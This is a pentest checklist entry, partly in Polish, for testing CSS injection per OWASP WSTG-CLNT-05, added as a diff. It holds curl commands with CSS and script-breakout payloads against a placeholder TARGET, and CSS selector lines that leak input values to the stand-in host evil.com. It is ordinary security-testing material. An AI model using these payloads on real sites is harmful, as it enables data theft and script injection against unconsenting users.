@@ -1,0 +1,42 @@
+# WSTG-CLNT-05 — Testing for CSS Injection
+
+## Cele
+
+- Identify CSS injection points
+- Assess the impact of the injection
+
+## KOMENDY
+
+### CSS injection
+
+```bash
+curl -s "https://TARGET/page?style=color:red;background:url(http://evil.com/steal)"
+curl -s "https://TARGET/page?input=</style><script>alert(1)</script>"
+curl -s "https://TARGET/page?color=red;}</style><script>alert(1)</script><style>"
+
+```
+
+### CSS data exfiltration
+
+```bash
+# input[value^="a"]{background:url(http://evil.com/a)}
+curl -s "https://TARGET/page?css=input[value^='a']{background:url(http://evil.com/a)}"
+
+```
+
+## KOMENDY Z WORDLISTAMI
+
+### PayloadsAllTheThings CSS Injection
+
+```bash
+# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CSS Injection/README.md
+
+```
+
+## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+
+1. Zidentyfikuj miejsca gdzie user input trafia do CSS (style attrs, CSS files)
+2. Testuj wstrzykiwanie CSS properties
+3. Sprawdz mozliwosc exfiltracji danych via CSS selectors
+4. Testuj break z kontekstu CSS do HTML/JS
+
